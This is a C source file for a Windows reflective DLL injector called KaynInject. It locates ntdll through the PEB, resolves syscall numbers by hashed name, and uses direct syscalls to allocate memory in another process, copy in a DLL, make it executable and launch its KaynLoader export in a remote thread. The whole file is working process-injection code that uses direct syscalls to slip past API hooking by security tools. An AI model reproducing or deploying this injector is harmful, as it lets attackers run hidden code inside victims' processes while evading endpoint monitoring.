#include <Syscall.h>
#include <KaynInject.h>

#include <winternl.h>
#include <stdio.h>

DWORD HashStringA(PCHAR String)
{
    ULONG Hash = 5381;
    INT c;

    while (c = *String++)
        Hash = ((Hash << 5) + Hash) + c;

    return Hash;
}

DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress )
{
    WORD wIndex                          = 0;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders         = NULL;

    pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

    pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

    if( dwRva < pSectionHeader[0].PointerToRawData )
        return dwRva;

    for( wIndex=0 ; wIndex < pNtHeaders->FileHeader.NumberOfSections ; wIndex++ )
    {
        if( dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData) )
            return ( dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData );
    }

    return 0;
}

DWORD KaynOffset( LPVOID lpReflectiveDllBuffer, DWORD dwKaynEntryHash )
{
    UINT_PTR uiBaseAddress   = 0;
    UINT_PTR uiExportDir     = 0;
    UINT_PTR uiNameArray     = 0;
    UINT_PTR uiAddressArray  = 0;
    UINT_PTR uiNameOrdinals  = 0;
    DWORD dwCounter          = 0;

    uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

    uiNameArray     = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
    uiExportDir     = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress );
    uiNameArray     = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames, uiBaseAddress );
    uiAddressArray  = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );
    uiNameOrdinals  = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals, uiBaseAddress );

    dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->NumberOfNames;

    while( dwCounter-- )
    {
        PCHAR cpExportedFunctionName = (PCHAR)(uiBaseAddress + Rva2Offset( *(PDWORD)uiNameArray, uiBaseAddress ));

        if( HashStringA(cpExportedFunctionName) == dwKaynEntryHash )
        {
            uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );
            uiAddressArray += ( *(PWORD)uiNameOrdinals * sizeof(DWORD) );

            return Rva2Offset( *(PDWORD)uiAddressArray, uiBaseAddress );
        }

        uiNameArray += sizeof(DWORD);
        uiNameOrdinals += sizeof(WORD);
    }

    return 0;
}

LPVOID KaynInject( HANDLE hProcess, LPVOID lpBuffer, DWORD dwBufferSize, LPVOID lpParameter )
{
    LPVOID lpRemoteLibraryBuffer              = NULL;
    LPTHREAD_START_ROUTINE lpKaynLoader       = NULL;
    HANDLE hThread                            = NULL;
    DWORD dwKaynLoaderOffset                  = 0;
    DWORD dwOldProtection                     = 0;
    DWORD dwVirtualSize                       = dwBufferSize;

#ifdef WIN_X64
    PPEB pPeb = (PPEB)__readgsqword( 0x60 );
#else
    PPEB pPeb = (PPEB)__readgsqword( 0x30 );
#endif

    PLDR_DATA_TABLE_ENTRY   pLdrDataEntry         = ( PLDR_DATA_TABLE_ENTRY )( (PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10 );
    PIMAGE_NT_HEADERS       pImageNtHeaders       = RVA_2_VA( PIMAGE_NT_HEADERS, pLdrDataEntry->DllBase, ((PIMAGE_DOS_HEADER)pLdrDataEntry->DllBase)->e_lfanew );
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = RVA_2_VA( PIMAGE_EXPORT_DIRECTORY, pLdrDataEntry->DllBase, pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress );

    WORD Sys_NtAllocateVirtualMemory = GetSyscall( pLdrDataEntry->DllBase, pImageExportDirectory, HashStringA( "NtAllocateVirtualMemory" ) );
    WORD Sys_NtWriteVirtualMemory    = GetSyscall( pLdrDataEntry->DllBase, pImageExportDirectory, HashStringA( "NtWriteVirtualMemory" ) );
    WORD Sys_NtProtectVirtualMemory  = GetSyscall( pLdrDataEntry->DllBase, pImageExportDirectory, HashStringA( "NtProtectVirtualMemory" ) );
    WORD Sys_NtCreateThreadEx        = GetSyscall( pLdrDataEntry->DllBase, pImageExportDirectory, HashStringA( "NtCreateThreadEx" ) );

    if( !hProcess  || !lpBuffer || !dwBufferSize )
        return NULL;

    dwKaynLoaderOffset = KaynOffset( lpBuffer, HashStringA( "KaynLoader" ) );
    if( !dwKaynLoaderOffset )
    {
        puts( "[-] Couldn't find KaynLoader" );
        return NULL;
    }

    // Allocate Memory
    SyscallPrepare( Sys_NtAllocateVirtualMemory );
    if ( NT_SUCCESS( SyscallInvoke( hProcess, &lpRemoteLibraryBuffer, 0, (PULONG)&dwVirtualSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) )
    {
        printf( "[+] Successful allocated remote memory: lpRemoteLibraryBuffer:[%p]\n", lpRemoteLibraryBuffer );

        // Write Dll buffer into remote memory
        SyscallPrepare( Sys_NtWriteVirtualMemory );
        if ( NT_SUCCESS( SyscallInvoke( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwBufferSize, 0 ) ) )
        {
            puts( "[+] Successful copied dll buffer" );

            // change protection from RW to RX
            SyscallPrepare( Sys_NtProtectVirtualMemory );
            if ( NT_SUCCESS( SyscallInvoke( hProcess, &lpRemoteLibraryBuffer, &dwVirtualSize, PAGE_EXECUTE_READ, &dwOldProtection) ) )
            {
                puts( "[+] Successful change protection: RW -> RX" );
                lpKaynLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwKaynLoaderOffset );

                // Call KaynLoader in a remote thread
                SyscallPrepare( Sys_NtCreateThreadEx );
                if ( NT_SUCCESS( SyscallInvoke( &hThread, GENERIC_EXECUTE, NULL, hProcess, lpKaynLoader, lpParameter, FALSE, NULL, NULL, NULL, NULL ) ) )
                {
                    printf( "[+] Successful injected DLL: hThread:[%x]\n", hThread );
                } else
                    puts( "[-] Couldn't create remote thread" );

            } else
                puts( "[-] Couldn't change memory protection from RW to RX" );

        }
        else
            puts( "[-] Couldn't copy dll buffer" );

    } else
        puts( "[-] Couldn't allocate virtual memory" );

    return hThread;
}